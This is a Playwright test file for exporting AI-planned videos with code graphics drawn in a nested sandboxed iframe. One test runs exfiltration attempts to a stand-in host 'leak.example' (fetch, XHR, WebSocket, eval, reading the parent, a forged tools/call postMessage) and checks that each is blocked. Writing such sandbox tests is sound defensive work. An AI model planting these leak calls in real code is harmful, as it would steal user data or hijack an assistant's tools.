// ROUND-C3 Part 0.2 (RDC3-001 to RDC3-004): code graphics in the in-chat
// export. The card bakes Tier B blocks and Tier C free code in a NESTED
// frame (sandbox="allow-scripts", our sandbox page with connect-src 'none');
// the card keeps its bridge to the chat. D-447 is superseded.
import { readFileSync } from 'node:fs';
import { test, expect, allowError } from './fixtures';
import {
  ensureCardBuild,
  mountCard,
  startC2Stack,
  type C2Stack,
} from './round-c2-stack';

let stack: C2Stack | null = null;
test.beforeAll(() => ensureCardBuild());
test.afterEach(async () => {
  await stack?.close();
  stack = null;
});
const BAR_RISE = readFileSync(
  'tests/fixtures/round-c1/bar-rise.block.js',
  'utf8',
);
const ORBIT = readFileSync(
  'tests/fixtures/round-c1/orbit-ring.free.js',
  'utf8',
);
const FOREVER = readFileSync(
  'tests/fixtures/round-c3/forever.block.js',
  'utf8',
);
const ORBIT_META = {
  id: 'orbit-ring',
  name: 'Orbit ring',
  version: '1.0.0',
  category: 'Motion',
  duration: 4,
  params: [
    { name: 'color', label: 'Colour', type: 'color', default: '#22cc88' },
    {
      name: 'count',
      label: 'Dots',
      type: 'number',
      min: 1,
      max: 40,
      step: 1,
      default: 8,
    },
  ],
};
const text = (r: unknown) =>
  ((r as { content: unknown }).content as { type: string; text?: string }[])
    .filter((c) => c.type === 'text')
    .map((c) => c.text)
    .join('\n');
const codePlan = (defs: unknown[], scenes: unknown[]) => ({
  format: 'video-plan',
  version: 4,
  meta: { title: 'Graphics', language: 'en', aspect: '9:16', fps: 24 },
  captions: { enabled: false },
  defs: { blocks: defs },
  scenes,
});
const scene = (id: string, block: string) => ({
  id,
  title: id,
  narration: 'A graphic.',
  durationHint: 2,
  layers: [{ id: `${id}-g`, kind: 'block', block, name: 'Graphic' }],
});

async function approved(plan: unknown) {
  stack = await startC2Stack();
  const claude = await stack.claude();
  const call = async (name: string, args: Record<string, unknown>) =>
    claude.callTool({ name, arguments: args });
  const p = text(await call('create_project', { name: 'Code' }));
  const projectId = /project_id (proj-[0-9a-f-]+)/.exec(p)![1]!;
  const v = text(
    await call('create_video', { project_id: projectId, name: 'Graphics' }),
  );
  const videoId = /video_id ([0-9a-f-]{36})/.exec(v)![1]!;
  expect(text(await call('submit_plan', { video_id: videoId, plan }))).toMatch(
    /^Built/,
  );
  await call('get_plan_cost', { video_id: videoId });
  expect(text(await call('approve_plan', { video_id: videoId }))).toMatch(
    /^Approved/,
  );
  const result = await call('export_video', { video_id: videoId });
  expect(text(result)).toMatch(/^The export card is shown/);
  return { claude, call, videoId, result };
}
const cspNoise = (page: import('@playwright/test').Page, id: string) =>
  allowError(
    page,
    (m) =>
      /Content Security Policy|blob:|Failed to load resource|leak\.example|localStorage|sandboxed|Blocked/i.test(
        m,
      ),
    `${id}: the card tries a blob: player first (C2 spike item 5), and the sandbox's own CSP and opaque origin refuse what code inside tries; those refusals are logged by the browser.`,
  );

test('[RDC3-001] a video with a Tier B block and a Tier C free-code scene exports inside the chat card: both are drawn in a nested sandbox frame (allow-scripts only) and the file plays and downloads', async ({
  page,
}) => {
  test.setTimeout(8 * 60_000);
  cspNoise(page, 'RDC3-001');
  const { claude, result, call, videoId } = await approved(
    codePlan(
      [
        { id: 'bar-rise', tier: 'B', source: BAR_RISE, summary: 'Bars.' },
        {
          id: 'orbit-ring',
          tier: 'C',
          source: ORBIT,
          meta: ORBIT_META,
          summary: 'Dots.',
        },
      ],
      [scene('bars', 'bar-rise'), scene('orbit', 'orbit-ring')],
    ),
  );
  const frame = await mountCard(page, stack!, claude, result);
  // The nested frame: our sandbox page, scripts only, no same-origin.
  await expect(frame.locator('iframe[data-code-sandbox]')).toHaveAttribute(
    'sandbox',
    'allow-scripts',
  );
  await expect(frame.getByRole('button', { name: 'Download' })).toBeVisible({
    timeout: 6 * 60_000,
  });
  await expect
    .poll(() =>
      frame.locator('video').evaluate((el: HTMLVideoElement) => el.readyState),
    )
    .toBeGreaterThanOrEqual(2);
  await frame.getByRole('button', { name: 'Download' }).click();
  await expect
    .poll(() => page.evaluate(() => window.__host.downloads.length))
    .toBe(1);
  await expect
    .poll(() => page.evaluate(() => window.__host.calls))
    .toEqual(['export_done', 'submit_frames']);
  // The frames Claude gets back show the graphics (not blank black).
  const frames = await call('get_frames', { video_id: videoId });
  const images = (frames.content as { type: string; data?: string }[]).filter(
    (c) => c.type === 'image',
  );
  expect(images).toHaveLength(6);
});

test('[RDC3-002] the nested sandbox stops code that reaches out: fetch, XMLHttpRequest, a WebSocket, eval of a network string, localStorage, reading the card, and postMessage to the top window all fail or are ignored; the checks refuse such code before it is ever sent', async ({
  page,
}) => {
  test.setTimeout(4 * 60_000);
  cspNoise(page, 'RDC3-002');
  stack = await startC2Stack();
  let leaked = 0;
  await page.context().route('https://leak.example/**', (r) => {
    leaked++;
    return r.fulfill({ status: 200, body: 'x' });
  });
  await page.goto('/e2e/mcp-host/host.html');
  await page.waitForFunction(() => typeof window.startCard === 'function');
  // The same nested frame the card makes, here under the host page.
  await page.evaluate((src) => {
    const f = document.createElement('iframe');
    f.setAttribute('sandbox', 'allow-scripts');
    f.id = 'nested';
    f.src = src;
    document.body.append(f);
  }, `${stack.url}/mcp/card/sandbox.html`);
  let nested: import('@playwright/test').Frame | undefined;
  await expect
    .poll(
      () =>
        (nested = page
          .frames()
          .find((f) => f.url().endsWith('/mcp/card/sandbox.html'))),
    )
    .toBeTruthy();
  await nested!.waitForLoadState();
  const outcome = await nested!.evaluate(async () => {
    const U = 'https://leak.example/steal';
    const r: Record<string, string> = {};
    const attempt = async (name: string, f: () => unknown) => {
      try {
        await f();
        r[name] = 'ran';
      } catch (e) {
        r[name] = `stopped: ${(e as Error).name}`;
      }
    };
    await attempt('fetch', () => fetch(U));
    await attempt(
      'xhr',
      () =>
        new Promise((ok, no) => {
          const x = new XMLHttpRequest();
          x.onload = ok;
          x.onerror = () => no(new Error('network'));
          x.open('GET', U);
          x.send();
        }),
    );
    await attempt(
      'websocket',
      () =>
        new Promise((ok, no) => {
          const w = new WebSocket('wss://leak.example/');
          w.onopen = ok;
          w.onerror = () => no(new Error('network'));
        }),
    );
    // eslint-disable-next-line no-eval
    await attempt('eval-network', () => eval(`fetch(${JSON.stringify(U)})`));
    await attempt('localStorage', () => localStorage.setItem('leak', '1'));
    await attempt('read-parent', () => parent.document.body.innerHTML);
    await attempt('top-postMessage', () =>
      top!.postMessage(
        {
          jsonrpc: '2.0',
          id: 9,
          method: 'tools/call',
          params: { name: 'leak' },
        },
        '*',
      ),
    );
    return r;
  });
  expect(outcome.fetch).toMatch(/^stopped/);
  expect(outcome.xhr).toMatch(/^stopped/);
  expect(outcome.websocket).toMatch(/^stopped/);
  expect(outcome['eval-network']).toMatch(/^stopped/);
  expect(outcome.localStorage).toMatch(/^stopped/);
  expect(outcome['read-parent']).toMatch(/^stopped/);
  // A message can be posted, but nothing listens to it: the host's bridge
  // hears only its card, and no tool runs.
  expect(await page.evaluate(() => window.__host.calls)).toEqual([]);
  expect(leaked).toBe(0);
  // Before any of this, the checks refuse such code in a plan.
  const claude = await stack.claude();
  const p = text(
    await claude.callTool({ name: 'create_project', arguments: { name: 'H' } }),
  );
  const projectId = /project_id (proj-[0-9a-f-]+)/.exec(p)![1]!;
  const v = text(
    await claude.callTool({
      name: 'create_video',
      arguments: { project_id: projectId, name: 'H' },
    }),
  );
  const videoId = /video_id ([0-9a-f-]{36})/.exec(v)![1]!;
  const bad = ORBIT.replace(
    'renderFrame({ t }) {',
    "renderFrame({ t }) { fetch('https://leak.example/');",
  );
  const refused = await claude.callTool({
    name: 'submit_plan',
    arguments: {
      video_id: videoId,
      plan: codePlan(
        [{ id: 'orbit-ring', tier: 'C', source: bad, meta: ORBIT_META }],
        [scene('one', 'orbit-ring')],
      ),
    },
  });
  expect(text(refused)).toMatch(
    /^The plan could not be built: New graphic "orbit-ring": .*(external URLs are forbidden|fetch is unavailable)/,
  );
  expect(leaked).toBe(0);
});

test('[RDC3-003] a code graphic that never returns is cut off by the time limit and the card says so in plain words; nothing is counted', async ({
  page,
}) => {
  test.setTimeout(4 * 60_000);
  cspNoise(page, 'RDC3-003');
  const { claude, result } = await approved(
    codePlan(
      [{ id: 'forever', tier: 'B', source: FOREVER, summary: 'Loops.' }],
      [scene('one', 'forever')],
    ),
  );
  const frame = await mountCard(page, stack!, claude, result);
  await expect(frame.locator('#card')).toContainText(
    'The export stopped: A code graphic took too long to draw one frame (more than 2 seconds).',
    { timeout: 2 * 60_000 },
  );
  await expect(frame.getByRole('button', { name: 'Download' })).toHaveCount(0);
  expect(await page.evaluate(() => window.__host.calls)).toEqual([]);
});

test('[RDC3-004] measured: a Circumference-style 60 s 9:16 video with six code graphics (three blocks, three free-code scenes) renders in the chat card; the time is written to reports/round-c3/code-export-timing.json', async ({
  page,
}) => {
  test.setTimeout(30 * 60_000);
  cspNoise(page, 'RDC3-004');
  const ten = (s: string) =>
    s.replace('defaultDuration: 4', 'defaultDuration: 10');
  const defs = [0, 1, 2].flatMap((i) => [
    {
      id: `bars-${i}`,
      tier: 'B',
      source: ten(BAR_RISE).replace("id: 'bar-rise'", `id: 'bars-${i}'`),
      summary: 'Bars.',
    },
    {
      id: `orbit-${i}`,
      tier: 'C',
      source: ORBIT.replace("id: 'orbit-ring'", `id: 'orbit-${i}'`).replace(
        'duration: 4',
        'duration: 10',
      ),
      meta: { ...ORBIT_META, id: `orbit-${i}`, duration: 10 },
      summary: 'Dots.',
    },
  ]);
  const scenes = defs.map((d, i) => ({
    ...scene(`s${i}`, d.id),
    durationHint: 10,
  }));
  const { claude, result } = await approved(codePlan(defs, scenes));
  const began = Date.now();
  const frame = await mountCard(page, stack!, claude, result);
  await expect(frame.getByRole('button', { name: 'Download' })).toBeVisible({
    timeout: 28 * 60_000,
  });
  const seconds = Math.round((Date.now() - began) / 100) / 10;
  const { mkdirSync, writeFileSync } = await import('node:fs');
  mkdirSync('reports/round-c3', { recursive: true });
  writeFileSync(
    'reports/round-c3/code-export-timing.json',
    `${JSON.stringify(
      {
        video:
          '60 s, 9:16, 24 fps, six code graphics (3 Tier B, 3 Tier C), export preset standard',
        browser: 'Playwright Chromium (Linux sandbox, software rendering)',
        secondsUntilDownload: seconds,
        measuredAt: new Date().toISOString(),
      },
      null,
      2,
    )}\n`,
  );
  expect(seconds).toBeGreaterThan(0);
});
